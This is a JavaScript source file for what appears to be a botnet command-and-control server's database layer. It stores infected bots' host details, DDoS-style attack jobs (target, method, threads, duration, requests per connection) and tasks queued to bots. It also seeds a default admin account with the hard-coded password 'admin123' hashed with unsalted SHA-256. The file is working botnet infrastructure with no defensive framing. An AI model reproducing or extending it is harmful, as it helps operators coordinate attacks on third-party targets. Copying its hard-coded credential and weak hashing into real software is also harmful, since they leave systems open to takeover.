import sqlite3 from 'sqlite3';
import { open } from 'sqlite';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import { logger } from '../utils/logger.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

export class C2Database {
    constructor(dbPath = null) {
        this.dbPath = dbPath || join(__dirname, '../../c2.db');
        this.db = null;
    }

    async initialize() {
        this.db = await open({
            filename: this.dbPath,
            driver: sqlite3.Database
        });
        await this.createTables();
        await this.createDefaultUser();
        logger.success('✅ C2 Database initialized');
    }

    async createTables() {
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY, username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL, role TEXT DEFAULT 'admin', createdAt TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS bots (
                id TEXT PRIMARY KEY, hostname TEXT, ip TEXT, os TEXT, arch TEXT,
                cpus INTEGER, memory INTEGER, version TEXT, status TEXT DEFAULT 'offline',
                stats TEXT, registeredAt TEXT NOT NULL, lastSeen TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS attacks (
                id TEXT PRIMARY KEY, target TEXT NOT NULL, method TEXT NOT NULL,
                threads INTEGER, duration INTEGER, rpc INTEGER, botIds TEXT,
                status TEXT DEFAULT 'pending', stats TEXT, createdAt TEXT NOT NULL,
                startedAt TEXT, endedAt TEXT
            );
            CREATE TABLE IF NOT EXISTS tasks (
                id TEXT PRIMARY KEY, attackId TEXT, botId TEXT NOT NULL,
                type TEXT NOT NULL, command TEXT NOT NULL, status TEXT DEFAULT 'pending',
                result TEXT, createdAt TEXT NOT NULL, completedAt TEXT
            );
            CREATE INDEX IF NOT EXISTS idx_bots_status ON bots(status);
            CREATE INDEX IF NOT EXISTS idx_attacks_status ON attacks(status);
            CREATE INDEX IF NOT EXISTS idx_tasks_botId ON tasks(botId);
        `);
    }

    async createDefaultUser() {
        const password = crypto.createHash('sha256').update('admin123').digest('hex');
        try {
            await this.db.run(`INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?)`,
                [crypto.randomUUID(), 'admin', password, 'admin', new Date().toISOString()]);
        } catch (e) {}
    }

    async getUser(username) {
        return await this.db.get('SELECT * FROM users WHERE username = ?', [username]);
    }

    async saveBot(bot) {
        await this.db.run(`INSERT OR REPLACE INTO bots VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [bot.id, bot.hostname, bot.ip, bot.os, bot.arch, bot.cpus, bot.memory, 
             bot.version, bot.status, JSON.stringify(bot.stats || {}), bot.registeredAt, bot.lastSeen]);
    }

    async getBot(botId) {
        const bot = await this.db.get('SELECT * FROM bots WHERE id = ?', [botId]);
        if (bot?.stats) bot.stats = JSON.parse(bot.stats);
        return bot;
    }

    async getBots() {
        const bots = await this.db.all('SELECT * FROM bots ORDER BY lastSeen DESC');
        return bots.map(b => { if (b.stats) b.stats = JSON.parse(b.stats); return b; });
    }

    async updateBot(botId, bot) {
        await this.db.run(`UPDATE bots SET hostname=?, ip=?, os=?, arch=?, cpus=?, memory=?, 
            version=?, status=?, stats=?, lastSeen=? WHERE id=?`,
            [bot.hostname, bot.ip, bot.os, bot.arch, bot.cpus, bot.memory, bot.version,
             bot.status, JSON.stringify(bot.stats || {}), bot.lastSeen, botId]);
    }

    async saveAttack(attack) {
        await this.db.run(`INSERT INTO attacks VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [attack.id, attack.target, attack.method, attack.threads, attack.duration, attack.rpc,
             JSON.stringify(attack.botIds), attack.status, JSON.stringify(attack.stats),
             attack.createdAt, attack.startedAt, attack.endedAt]);
    }

    async getAttack(attackId) {
        const attack = await this.db.get('SELECT * FROM attacks WHERE id = ?', [attackId]);
        if (attack) {
            if (attack.stats) attack.stats = JSON.parse(attack.stats);
            if (attack.botIds) attack.botIds = JSON.parse(attack.botIds);
        }
        return attack;
    }

    async getAttacks(filters = {}) {
        let query = 'SELECT * FROM attacks';
        const params = [];
        if (filters.status) {
            query += ' WHERE status = ?';
            params.push(filters.status);
        }
        query += ' ORDER BY createdAt DESC';
        if (filters.limit) query += ` LIMIT ${parseInt(filters.limit)}`;
        
        const attacks = await this.db.all(query, params);
        return attacks.map(a => {
            if (a.stats) a.stats = JSON.parse(a.stats);
            if (a.botIds) a.botIds = JSON.parse(a.botIds);
            return a;
        });
    }

    async updateAttack(attackId, attack) {
        await this.db.run(`UPDATE attacks SET status=?, stats=?, startedAt=?, endedAt=? WHERE id=?`,
            [attack.status, JSON.stringify(attack.stats), attack.startedAt, attack.endedAt, attackId]);
    }

    async saveTask(task) {
        await this.db.run(`INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [task.id, task.attackId, task.botId, task.type, JSON.stringify(task.command),
             task.status, null, task.createdAt, null]);
    }

    async getTask(taskId) {
        const task = await this.db.get('SELECT * FROM tasks WHERE id = ?', [taskId]);
        if (task?.command) task.command = JSON.parse(task.command);
        if (task?.result) task.result = JSON.parse(task.result);
        return task;
    }

    async getTasks(filters = {}) {
        let query = 'SELECT * FROM tasks';
        const params = [];
        if (filters.status) {
            query += ' WHERE status = ?';
            params.push(filters.status);
        }
        query += ' ORDER BY createdAt DESC';
        const tasks = await this.db.all(query, params);
        return tasks.map(t => {
            if (t.command) t.command = JSON.parse(t.command);
            if (t.result) t.result = JSON.parse(t.result);
            return t;
        });
    }

    async getTasksByBot(botId) {
        const tasks = await this.db.all('SELECT * FROM tasks WHERE botId = ? AND status = ? ORDER BY createdAt DESC',
            [botId, 'pending']);
        return tasks.map(t => { if (t.command) t.command = JSON.parse(t.command); return t; });
    }

    async getTasksByAttack(attackId) {
        const tasks = await this.db.all('SELECT * FROM tasks WHERE attackId = ?', [attackId]);
        return tasks.map(t => { if (t.command) t.command = JSON.parse(t.command); return t; });
    }

    async updateTask(taskId, task) {
        await this.db.run(`UPDATE tasks SET status=?, result=?, completedAt=? WHERE id=?`,
            [task.status, JSON.stringify(task.result || {}), task.completedAt, taskId]);
    }

    async close() {
        if (this.db) await this.db.close();
    }
}
